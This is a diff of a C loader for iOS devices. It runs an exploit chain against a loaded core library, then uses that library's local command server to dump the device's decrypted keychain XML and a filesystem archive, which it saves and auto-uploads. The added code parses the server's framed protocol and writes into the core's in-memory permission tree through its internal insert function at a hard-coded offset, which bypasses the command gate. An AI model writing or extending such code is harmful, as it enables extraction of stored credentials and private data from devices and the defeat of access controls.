@@ -1,4 +1,4 @@
-/* loader89.c - 89yl 双链路加载器 v6.7 (keychain-acq)
+/* loader89.c - 89yl 双链路加载器 v6.7.1 (keychain-acq2)
  * exploit chain: AcqViewCntrlr_ RunServer + Sploit
  * MHA/MCM fallback chain: libuiopsersvc `_mcm_filza_run` -> virtual root
  * Both chains write a real tar archive and auto-upload it.
@@ -20,17 +20,21 @@
  *             map begin pointer (core+0x6c3818) is already non-zero the
  *             inits are considered done (dyld or a previous run) and skipped.
  *             The constructor now also logs which launch path was taken.
- * v6.7 keychain-acq: after exploit success (core+0x6b96d8 raw==0), while the
- *             RunServer listener thread is alive, act as a TCP CLIENT of the
- *             core's own command server on 127.0.0.1:40000 (reverse-engineered
- *             protocol: [cmd:1][argc:4 LE], cmd5 = raw keychain XML until EOF,
- *             cmd4 = 1 status byte + tar.gz archive until EOF). Keychain XML
- *             is uploaded as its own "keychain" acquisition BEFORE the
- *             filesystem acquisition; the core filesystem export joins the
- *             "filesystem" acquisition alongside the loader's own bundle tar
- *             (fixes the V66.1 empty-filesystem-package regression, which was
- *             produced by the SD auto-chain, not by the loader). Exploit
- *             failure adds ZERO new calls; the 26.x MCM branch is untouched.
+ * v6.7.1 keychain-acq2 (protocol fix for the V67 field failure where both
+ *             commands got only "01 00 00 00 01 00 00 00" + recv timeout):
+ *             the response protocol is 8-byte-header frames (type 1 status
+ *             / type 2 data / type 3 close), NOT raw-to-EOF, and the
+ *             dispatcher serves ONE command per connection, so each command
+ *             now gets its own fresh connection. The 8-byte reply was
+ *             statusFrame(reason=1) = command not in the supported-command
+ *             tree, so core_ensure_supported_cmds() inserts cmds 4/5 via the
+ *             core's own insert fn (core+0x7574) before connecting. Budgets:
+ *             120s per command / 300s total (the cmd5 dump is synchronous
+ *             and can take tens of seconds). Keychain XML is uploaded as its
+ *             own "keychain" acquisition BEFORE the filesystem acquisition;
+ *             the core filesystem export joins the "filesystem" acquisition
+ *             alongside the loader's own bundle tar. Exploit failure adds
+ *             ZERO new calls; the 26.x MCM branch is untouched.
  */
 typedef unsigned long u64;
 typedef long long i64;
@@ -791,6 +795,7 @@ static char g_core_fs_path[600];
 static long g_core_fs_size;
 static void acquire_core_artifacts(void);
 static void upload_core_keychain(void);
+static void core_ensure_supported_cmds(void *core); /* v6.7.1 */
 
 struct exploit_status {
     int sploit_done;
@@ -979,6 +984,14 @@ static int exploit_class_main(void *acqCls, void *core) {
              g_exploit_sts.core_base_resolved, g_exploit_sts.raw_flag);
     log_info(msg);
     if (ok) {
+        /* v6.7.1: the V67 field run proved Sploit's own registration
+         * under-populates the supported-command tree on 18.6.2 (both cmd4
+         * and cmd5 were answered with the 8-byte statusFrame reason=1).
+         * Ensure cmds 4/5 are in the tree BEFORE the first connection -
+         * the RunServer thread is parked in accept(), so the tree is not
+         * read concurrently. Exploit failure never reaches this, so the
+         * failure branch gains zero new calls (constraint unchanged). */
+        core_ensure_supported_cmds(core);
         /* v6.7 keychain-acq: with the exploit succeeded the RunServer
          * listener thread is alive (both the fork-child and the direct
          * fallback path converge here), so pull the keychain XML (cmd5)
@@ -1236,33 +1249,70 @@ static void write_inventory_files(const char *mcm_root) {
     log_info(msg);
 }
 
-/* ---------- v6.7 core TCP acquisition (keychain cmd5 / filesystem cmd4) ----------
- * Reverse-engineered from trx_extract/webuiopsercore (B台 18.6.2 sample):
- *  - AcqViewCntrlr_ RunServer IMP @0x4688 binds a TCP command server on
- *    127.0.0.1:40000 (sockaddr built in the accept loop @0x58c930:
- *    family=2, port=htons(0x9c40)).
- *  - Per-connection command framing (dispatch fn @0x58d1dc + read_args
- *    @0x58e338): [cmd:1 byte via conn vtable+0x28][argc:4 bytes via conn
- *    vtable+0x28][argc strings via conn vtable+0x30]. cmd==1 (GetAgentInfo)
- *    skips the arg block entirely.
- *  - cmd5 = KEYCHAIN: handler @0x58d8a4 builds task {conn, observer, ""}
- *    (constructor 0x58c1cc; the args vector is NOT touched -> argc=0 is
- *    valid), run fn 0x58c1d0 streams the decrypted keychain XML RAW to the
- *    connection (writer 0x58af70 -> conn vtable+0x10 raw write, no framing,
- *    no status byte) and the server closes the conn (vtable+0x40) when done.
- *    Client protocol: send {05 00 00 00 00}, read until EOF, save as XML.
- *    This is how the original 641,288-byte keychain XML was produced.
- *  - cmd4 = FILESYSTEM: handler @0x58d92c (gated by flag 0x6ca190, set per
- *    iOS by the core inits; B台 handshake supportedCommands=[4,5,6]) builds
- *    task {conn, observer, traversal policy @0x6ca158}; run fn 0x58b1bc
- *    first writes a 1-byte type/status via conn vtable+0x10 (2=directory
- *    archive, 1=single file), then 0x58b974 streams the tar.gz archive
- *    through conn callbacks. Client protocol: send {04 00 00 00 00}, read
- *    until EOF, strip the leading status byte when followed by the gzip
- *    magic (1f 8b), save as tar.gz. This is how the original 445,329-byte
- *    0_export_*.tar.gz (39 files / 4 containers) was produced; the empty
- *    1024-byte all-zero tar from the V66.1 run came from the SD auto-chain,
- *    not from this server path.
+/* ---------- v6.7.1 core TCP acquisition (keychain cmd5 / filesystem cmd4) ----------
+ * v6.7.1 protocol re-derivation - fixes the V67 field bug (both commands got
+ * ONLY the 8 bytes 01 00 00 00 01 00 00 00 and then a recv timeout, no EOF).
+ * Every offset below was re-verified by disassembling trx_extract/webuiopsercore:
+ *  - RESPONSE FRAMING (v6.7 wrongly assumed raw-to-EOF). All server writes go
+ *    through the per-connection object whose vtable lives at core+0x6b6868:
+ *      write(ptr,size)  vt+0x10 = 0x59729c: writes the 8-byte header
+ *                       {type=2 u32 LE, size u32 LE} FIRST (0x5972bc
+ *                       "mov w8,#2; stp w8,w2,[sp,#8]" + write at 0x5972cc)
+ *                       and then the raw payload (0x5972e0) -> a data frame
+ *                       is 02 00 00 00 <len LE32> <len raw bytes>, one frame
+ *                       per write call (payload is chunked across frames).
+ *      statusFrame(r)   vt+0x38 = 0x5975b0: writes EXACTLY 8 bytes
+ *                       {type=1 u32 LE, reason u32 LE} (0x5975bc "mov w8,#1;
+ *                       str x8,[sp,#8]" + "str w1,[sp,#0xc]" + write at
+ *                       0x5975d0) -> 01 00 00 00 <reason LE32>.
+ *      close()          vt+0x40 = 0x5975e0: writes EXACTLY 8 bytes
+ *                       03 00 00 00 00 00 00 00 (0x5975ec "mov w8,#3;
+ *                       str x8,[sp,#8]") and the conn is torn down.
+ *    => V67's observed "01 00 00 00 01 00 00 00" is statusFrame(reason=1)
+ *    emitted by the dispatcher gate at 0x58d63c; the conn is then abandoned
+ *    WITHOUT close (matches the V67 recv-timeout-no-EOF observation).
+ *    Reason codes: 1 = command not supported (gate2, 0x58d63c),
+ *    2 = accepted (0x58d538, sent BEFORE read_args), 3 = device not
+ *    exploited (gate1 fail path 0x58d618).
+ *  - ONE COMMAND PER CONNECTION: dispatcher 0x58d1dc reads a single cmd byte
+ *    (vt+0x28 into sp+0x7f), runs gate1 ([ServerGetDeviceStatus] via 0x5b80c8,
+ *    [core+0x6b96d8] must be 0) and gate2 ([ServerIsCmdSupported:] via
+ *    0x5b8148, walks the supported-command tree), sends the accept frame,
+ *    reads args (0x58e338: [argc:4 LE][argc strings via vt+0x30]; argc=0 is
+ *    valid - 0x58e604 returns success), dispatches once via the jump table
+ *    at 0x5fc499 and RETURNS (common exit 0x58dcdc). The connection is never
+ *    reused for a second command. v6.7.1 therefore opens ONE fresh
+ *    connection per command (this also removes the V67 hazard of sending
+ *    two commands on one connection, where the second command's bytes would
+ *    sit unread behind a connection the server already gave up on).
+ *  - cmd5 = KEYCHAIN: handler 0x58d8a4 -> task ctor 0x58c1cc + synchronous
+ *    run 0x58c1d0 (the dump can take tens of seconds; v6.7.1 budget 120s);
+ *    on success the handler calls vt+0x40 close (0x58d9dc). Wire sequence:
+ *    [01..02 accept][02.. data frames = raw keychain XML][03.. close].
+ *  - cmd4 = FILESYSTEM: handler 0x58d92c -> fs task ctor 0x58b1b8 with
+ *    traversal policy @0x6ca178, run 0x58b1bc streams the tar.gz through the
+ *    same framed writes, then close. Wire: [01..02][02.. data = gzip
+ *    stream][03..].
+ *  - WHY V67 WAS REJECTED (root cause): the supported-command tree is a
+ *    std::set-like red-black tree, object @core+0x6c3800 (root ptr @
+ *    core+0x6c3808, node cmd byte @node+0x19; static init 0x6458 = the
+ *    manual-init[0] the loader already runs). Population happens in the
+ *    exploit completion handler 0xaa50: each successful technique's result
+ *    set is merged via 0xab8c/0x7574, and IF cmd2 is present {3,4,6,7} are
+ *    added (0xab14-0xab44); the failure handlers reset it to {2,5} (0x74f8).
+ *    On the B台 18.6.2 run Sploit returned raw==0 but the winning technique
+ *    contributed no cmd 2/4/5, so BOTH cmd4 and cmd5 failed gate2 -> the
+ *    two identical 8-byte reason=1 replies in the V67 log.
+ *  - v6.7.1 FIX: core_ensure_supported_cmds() (below) inserts cmd 4 and 5
+ *    into the tree by CALLING THE CORE'S OWN insert function @0x7574 with
+ *    the exact ABI observed at all three core call sites (0xabc4, 0xab38,
+ *    0x7538): insert(tree=core+0x6c3800, rootfield=core+0x6c3808, cmdptr,
+ *    cmdptr). This is the same code path the core uses for itself (keeps
+ *    red-black invariants, dedups, operator-new 0x20-byte nodes) and it is
+ *    invoked in-process from the loader thread BEFORE any client connects,
+ *    while the RunServer thread is parked in accept() - no concurrent tree
+ *    access. Non-standard but evidence-based; the tree is the dispatcher's
+ *    ONLY permission gate for cmds 2-7 (cmd1 skips gate2 at 0x58d378).
  * Both requests are only issued AFTER exploit success (raw flag @ core
  * +0x6b96d8 == 0) while the RunServer listener thread is still alive, i.e.
  * from inside exploit_class_main's success branch (child or direct-fallback
@@ -1288,13 +1338,35 @@ static long g_core_keychain_size = -1;
 static char g_core_fs_path[600];
 static long g_core_fs_size = -1;
 
-/* Issues one command on the core's 127.0.0.1:40000 server and reads the
- * response until EOF (or budget/cap). Returns the payload length (>=0) with
- * *out_buf = malloc'd buffer (caller frees), or -1 on connect/send failure.
- * budget_s bounds the whole receive in wall-clock seconds; each recv also
- * has a 20s SO_RCVTIMEO so a dead server cannot hang the chain forever. */
+/* v6.7.1: reads exactly `want` bytes; returns bytes read (== want on
+ * success, < want on EOF) or -1 on timeout/error. */
+static long core_tcp_recv_full(int fd, unsigned char *buf, unsigned long want) {
+    unsigned long got = 0;
+    while (got < want) {
+        long n = recv(fd, buf + got, want - got, 0);
+        if (n > 0) { got += (unsigned long)n; continue; }
+        if (n == 0) return (long)got; /* EOF */
+        return -1;                     /* SO_RCVTIMEO hit or hard error */
+    }
+    return (long)got;
+}
+
+/* Issues ONE command on ONE fresh connection (the dispatcher serves exactly
+ * one command per connection: 0x58d1dc -> common exit 0x58dcdc) and parses
+ * the v6.7.1 framed response:
+ *   01 00 00 00 <reason LE32>   status frame (2 = accepted, 1 = cmd not
+ *                               supported, 3 = device not exploited)
+ *   02 00 00 00 <len LE32> ...  data frame, len raw payload bytes
+ *   03 00 00 00 00 00 00 00     close frame = server-side success/end
+ * Returns the total type-2 payload length (>= 0) with *out_buf = malloc'd
+ * buffer (caller frees) ONLY when the close frame was seen; returns -1 on
+ * connect/send/protocol failure, terminal status frame (reason 1/3), or
+ * budget expiry. budget_s also becomes the per-recv SO_RCVTIMEO - the cmd5
+ * dump runs synchronously in the dispatcher thread and can take tens of
+ * seconds, so the caller passes 120 (task spec), not V67's 20. */
 static long core_tcp_request(unsigned char cmd, long budget_s, long max_bytes, char **out_buf) {
     *out_buf = 0;
+    if (budget_s <= 0) budget_s = 120;
     int fd = -1;
     for (int attempt = 0; attempt < 12; attempt++) {
         int s = socket(2 /* AF_INET */, 1 /* SOCK_STREAM */, 0);
@@ -1311,10 +1383,12 @@ static long core_tcp_request(unsigned char cmd, long budget_s, long max_bytes, c
     }
     if (fd < 0) { log_error("core-tcp connect 127.0.0.1:40000 FAIL"); return -1; }
     struct l89_timeval tv;
-    tv.tv_sec = 20; tv.tv_usec = 0;
+    tv.tv_sec = budget_s; tv.tv_usec = 0;
     setsockopt(fd, 0xffff /* SOL_SOCKET */, 0x1006 /* SO_RCVTIMEO */, &tv, sizeof(tv));
     setsockopt(fd, 0xffff, 0x1005 /* SO_SNDTIMEO */, &tv, sizeof(tv));
-    /* wire format: [cmd:1][argc:4 LE] - both cmd4 and cmd5 take no args */
+    /* wire request: [cmd:1][argc:4 LE = 0] - argc=0 is valid for cmd4/cmd5
+     * (read_args 0x58e604 returns success for a zero count) and neither
+     * handler touches the args vector. */
     unsigned char req[5];
     req[0] = cmd;
     req[1] = 0; req[2] = 0; req[3] = 0; req[4] = 0;
@@ -1327,31 +1401,153 @@ static long core_tcp_request(unsigned char cmd, long budget_s, long max_bytes, c
     char *buf = (char *)malloc(cap);
     if (!buf) { close(fd); log_error("core-tcp malloc FAIL"); return -1; }
     long deadline = (long)time(0) + budget_s;
+    int ended = 0; /* saw the type-3 close frame */
+    char msg[200];
     for (;;) {
-        if ((long)time(0) > deadline) { log_warn("core-tcp budget exceeded"); break; }
-        long n = recv(fd, buf + len, cap - len, 0);
-        if (n > 0) {
-            len += (unsigned long)n;
-            if ((long)len >= max_bytes) { log_warn("core-tcp cap reached"); break; }
-            if (len == cap) {
+        if ((long)time(0) > deadline) { log_warn("core-tcp budget exceeded (no close frame)"); break; }
+        unsigned char hdr[8];
+        long n = core_tcp_recv_full(fd, hdr, 8);
+        if (n < 0) { log_warn("core-tcp frame header recv timeout/error"); break; }
+        if (n < 8) { log_warn("core-tcp EOF before complete frame header"); break; }
+        unsigned long ftype = (unsigned long)hdr[0] | ((unsigned long)hdr[1] << 8) |
+                              ((unsigned long)hdr[2] << 16) | ((unsigned long)hdr[3] << 24);
+        unsigned long fval = (unsigned long)hdr[4] | ((unsigned long)hdr[5] << 8) |
+                              ((unsigned long)hdr[6] << 16) | ((unsigned long)hdr[7] << 24);
+        if (ftype == 2) {
+            if (fval > (unsigned long)max_bytes || len + fval > (unsigned long)max_bytes) {
+                snprintf(msg, sizeof(msg), "core-tcp data frame exceeds cap (framelen=%lu total=%lu cap=%ld)",
+                         fval, len + fval, max_bytes);
+                log_warn(msg);
+                break;
+            }
+            int oom = 0;
+            while (cap < len + fval) {
                 unsigned long ncap = cap * 2;
                 char *nb = (char *)malloc(ncap);
-                if (!nb) { log_warn("core-tcp grow FAIL"); break; }
+                if (!nb) { oom = 1; break; }
                 memcpy(nb, buf, len);
                 free(buf);
                 buf = nb;
                 cap = ncap;
             }
-        } else if (n == 0) {
-            break; /* EOF: server closed the connection = transfer complete */
+            if (oom) { log_warn("core-tcp grow FAIL"); break; }
+            long got = core_tcp_recv_full(fd, (unsigned char *)buf + len, fval);
+            if (got < 0 || (unsigned long)got < fval) {
+                log_warn("core-tcp data payload truncated (EOF/timeout mid-frame)");
+                break;
+            }
+            len += fval;
+        } else if (ftype == 1) {
+            snprintf(msg, sizeof(msg), "core-tcp status frame reason=%lu (%s)", fval,
+                     fval == 2 ? "accepted" : (fval == 1 ? "cmd not supported" :
+                     (fval == 3 ? "device not exploited" : "unknown")));
+            log_info(msg);
+            if (fval != 2) {
+                /* Terminal: dispatcher already returned; conn abandoned
+                 * without close (that is why V67 saw a timeout, not EOF). */
+                close(fd);
+                free(buf);
+                return -1;
+            }
+        } else if (ftype == 3) {
+            ended = 1;
+            break;
         } else {
-            log_warn("core-tcp recv end (timeout or error); keeping partial");
+            snprintf(msg, sizeof(msg), "core-tcp unknown frame type=%lu val=%lu", ftype, fval);
+            log_warn(msg);
             break;
         }
     }
     close(fd);
+    if (!ended) { free(buf); return -1; }
     *out_buf = buf;
     return (long)len;
+}
+
+/* ---------- v6.7.1 supported-command tree repair ----------
+ * The tree is the dispatcher's gate2 (0x4a8c walks it for every cmd 2-7).
+ * Node layout per core code (gate2 0x4a98 reads node+0x19; insert 0x75c4
+ * stores node+0x19): [node+0]=left child (smaller cmds), [node+8]=right
+ * child (larger cmds), [node+0x19]=cmd byte. Tree object @core+0x6c3800:
+ * [+0]=begin, [+8]=root, [+0x10]=size (static init 0x6458). */
+
+/* In-order diagnostic walk (left, node, right), depth-guarded against
+ * corrupt structures. */
+static void core_cmdtree_collect(unsigned char *node, char *out, unsigned long cap, int depth) {
+    if (!node || depth > 16) return;
+    core_cmdtree_collect(*(unsigned char **)(void *)(node + 0), out, cap, depth + 1);
+    unsigned long n = strlen(out);
+    if (n + 6 < cap) snprintf(out + n, cap - n, "%u ", *(unsigned char *)(void *)(node + 0x19));
+    core_cmdtree_collect(*(unsigned char **)(void *)(node + 8), out, cap, depth + 1);
+}
+
+/* Same descent as gate2 0x4a98-0x4ab0: cmd < node -> [node+0], cmd > node
+ * -> [node+8], equal -> found. */
+static int core_tree_has(unsigned char *tree, unsigned char cmd) {
+    unsigned char *n = *(unsigned char **)(void *)(tree + 8); /* root */
+    int guard = 0;
+    while (n && guard++ < 64) {
+        unsigned char c = *(unsigned char *)(void *)(n + 0x19);
+        if (c == cmd) return 1;
+        n = *(unsigned char **)(void *)(n + (c > cmd ? 0 : 8));
+    }
+    return 0;
+}
+
+/* Inserts cmds 4 (filesystem) and 5 (keychain) into the core's
+ * supported-command tree by calling the core's own insert function at
+ * core+0x7574 with the ABI observed at its three core call sites
+ * (0xabc4 in ab8c, 0xab38 in aa50, 0x7538 in 0x74f8):
+ *     insert(x0=tree, x1=tree+8, x2=&cmd, x3=&cmd)
+ * The function lower-bounds (0x75f8), allocates a 0x20-byte node via
+ * operator new, stores the cmd byte at node+0x19 (0x75c4) and rebalances
+ * (0x77a0); duplicates return the existing node without inserting, so the
+ * call is idempotent. Only ever called from the exploit success branch,
+ * before the first TCP connection (RunServer thread parked in accept()).
+ * This is a deliberately non-standard, evidence-based step: the tree is
+ * plain in-process memory of the dlopened core image and the loader already
+ * both reads (base+0x6b96d8) and calls (manual __mod_init_func, InitLogs/
+ * RunServer/Sploit IMPs) into the same image, so calling one more internal
+ * function with its verified ABI is the lowest-risk way to repair the gate. */
+static void core_ensure_supported_cmds(void *core) {
+    if (!core) return;
+    unsigned char *base = 0;
+    if (!resolve_core_base(core, &base)) {
+        log_warn("cmd-tree ensure SKIPPED (core base not resolved); commands may be rejected");
+        return;
+    }
+    unsigned char *tree = base + 0x6c3800;
+    /* If the tree was never initialized (all-zero: static init 0x6458 did
+     * not run), replicate 0x6458's three stores verbatim so inserts start
+     * from a valid empty tree: [tree+0x10]=0 (size), [tree+8]=0 (root),
+     * [tree+0]=tree+8 (begin=end). Without this, the insert's lower-bound
+     * would walk garbage parent pointers. */
+    if (*(void **)(void *)(tree + 0) == 0 && *(void **)(void *)(tree + 8) == 0) {
+        *(void **)(void *)(tree + 0x10) = 0;
+        *(void **)(void *)(tree + 8) = 0;
+        *(void **)(void *)(tree) = (void *)(tree + 8);
+        log_warn("cmd-tree was all-zero; replicated static init 0x6458 stores");
+    }
+    char have[128];
+    char msg[220];
+    have[0] = 0;
+    core_cmdtree_collect(*(unsigned char **)(void *)(tree + 8), have, sizeof(have), 0);
+    snprintf(msg, sizeof(msg), "cmd-tree before ensure: [%s]", have);
+    log_info(msg);
+    typedef void (*core_insert_fn)(void *, void *, void *, void *);
+    core_insert_fn ins = (core_insert_fn)(void *)(base + 0x7574);
+    static const unsigned char wanted[2] = {0x04, 0x05};
+    for (int i = 0; i < 2; i++) {
+        if (core_tree_has(tree, wanted[i])) continue;
+        unsigned char c = wanted[i];
+        ins(tree, (void *)(tree + 8), (void *)&c, (void *)&c);
+        snprintf(msg, sizeof(msg), "cmd-tree inserted cmd=%u via core insert 0x7574", c);
+        log_info(msg);
+    }
+    have[0] = 0;
+    core_cmdtree_collect(*(unsigned char **)(void *)(tree + 8), have, sizeof(have), 0);
+    snprintf(msg, sizeof(msg), "cmd-tree after ensure: [%s]", have);
+    log_info(msg);
 }
 
 static void hex_head(const char *tag, const char *buf, long len) {
@@ -1368,17 +1564,27 @@ static void hex_head(const char *tag, const char *buf, long len) {
 /* Pulls the keychain XML (cmd5) and the core filesystem export (cmd4) off
  * the core's local command server and stores them under Documents/ with the
  * original naming convention (keychain_<ts>.xml / export_<ts>.tar.gz).
+ * v6.7.1: one fresh connection per command (the dispatcher serves exactly
+ * one command per connection), framed-response parsing inside
+ * core_tcp_request, 120s per command and 300s for the whole acquisition
+ * (task spec; V67's 60s total was too tight for a synchronous keychain
+ * dump that produced a 641KB XML on the reference device).
  * Only ever called with the exploit already succeeded. */
 static void acquire_core_artifacts(void) {
     char *home = getenv("HOME");
     if (!home) { log_warn("core-acq skip (no HOME)"); return; }
     long now = (long)time(0);
+    long total_deadline = now + 300; /* v6.7.1: total acquisition budget */
     char name[160];
+    char msg[220];
 
-    log_info("core-acq keychain cmd5 begin (budget=60s)");
+    long b1 = total_deadline - (long)time(0);
+    if (b1 > 120) b1 = 120;
+    snprintf(msg, sizeof(msg), "core-acq keychain cmd5 begin (budget=%lds)", b1);
+    log_info(msg);
     char *buf = 0;
-    long len = core_tcp_request(0x05, 60, 64 * 1024 * 1024, &buf);
-    hex_head("core-acq keychain recv", buf ? buf : "", len);
+    long len = core_tcp_request(0x05, b1, 64 * 1024 * 1024, &buf);
+    if (len > 0 && buf) hex_head("core-acq keychain payload", buf, len);
     if (len > 0 && buf && buf[0] == '<') {
         snprintf(name, sizeof(name), "keychain_%ld.xml", now);
         char *p = cat3(home, "/Documents/", name);
@@ -1390,27 +1596,34 @@ static void acquire_core_artifacts(void) {
             for (; i < sizeof(g_core_keychain_path) - 1 && p[i]; i++) g_core_keychain_path[i] = p[i];
             g_core_keychain_path[i] = 0;
             g_core_keychain_size = len;
-            char msg[700];
-            snprintf(msg, sizeof(msg), "core-acq keychain saved path=%s size=%ld", p, len);
-            log_info(msg);
+            char msg2[700];
+            snprintf(msg2, sizeof(msg2), "core-acq keychain saved path=%s size=%ld", p, len);
+            log_info(msg2);
         } else {
             log_error("core-acq keychain open FAIL");
         }
         free(p);
     } else {
-        log_warn(len > 0 ? "core-acq keychain NOT XML (discarded)" : "core-acq keychain empty/failed");
+        log_warn(len > 0 ? "core-acq keychain payload NOT XML (discarded)"
+                         : "core-acq keychain failed (no complete framed response; see status-frame log)");
     }
     free(buf);
 
-    log_info("core-acq filesystem cmd4 begin (budget=60s)");
+    long b2 = total_deadline - (long)time(0);
+    if (b2 > 120) b2 = 120;
+    snprintf(msg, sizeof(msg), "core-acq filesystem cmd4 begin (budget=%lds)", b2);
+    log_info(msg);
     buf = 0;
-    len = core_tcp_request(0x04, 60, 96 * 1024 * 1024, &buf);
-    hex_head("core-acq filesystem recv", buf ? buf : "", len);
+    len = core_tcp_request(0x04, b2, 96 * 1024 * 1024, &buf);
+    if (len > 0 && buf) hex_head("core-acq filesystem payload", buf, len);
     if (len > 0 && buf) {
         char *dat = buf;
         long dlen = len;
-        /* cmd4 prefixes the archive with a 1-byte type/status (1=file, 2=dir
-         * archive); strip it when the remainder is the gzip magic. */
+        /* v6.7.1: core_tcp_request already stripped every frame header, so
+         * the payload should be the pure gzip stream. Keep a defensive
+         * one-byte strip for a leading in-band type/status byte (the v6.7
+         * RE saw the fs task emit a 1-byte type via the same write path)
+         * - only applied when the remainder is the gzip magic. */
         if (dlen > 3 && (dat[0] == 1 || dat[0] == 2) &&
             (unsigned char)dat[1] == 0x1f && (unsigned char)dat[2] == 0x8b) {
             dat += 1;
@@ -1427,18 +1640,18 @@ static void acquire_core_artifacts(void) {
                 for (; i < sizeof(g_core_fs_path) - 1 && p[i]; i++) g_core_fs_path[i] = p[i];
                 g_core_fs_path[i] = 0;
                 g_core_fs_size = dlen;
-                char msg[700];
-                snprintf(msg, sizeof(msg), "core-acq filesystem saved path=%s size=%ld", p, dlen);
-                log_info(msg);
+                char msg2[700];
+                snprintf(msg2, sizeof(msg2), "core-acq filesystem saved path=%s size=%ld", p, dlen);
+                log_info(msg2);
             } else {
                 log_error("core-acq filesystem open FAIL");
             }
             free(p);
         } else {
-            log_warn("core-acq filesystem response NOT gzip (discarded; see head hex above)");
+            log_warn("core-acq filesystem payload NOT gzip (discarded; see head hex above)");
         }
     } else {
-        log_warn("core-acq filesystem empty/failed");
+        log_warn("core-acq filesystem failed (no complete framed response; see status-frame log)");
     }
     free(buf);
 }
@@ -1705,7 +1918,7 @@ static void *worker(void *arg) {
         log_info(dm);
     }
 
-    log_info("=== loader89 v6.7 keychain-acq start ===");
+    log_info("=== loader89 v6.7.1 keychain-acq2 start ===");
     read_runtime_config();
     {
         /* v5.8 problem C: child/worker exploit state goes to this file;
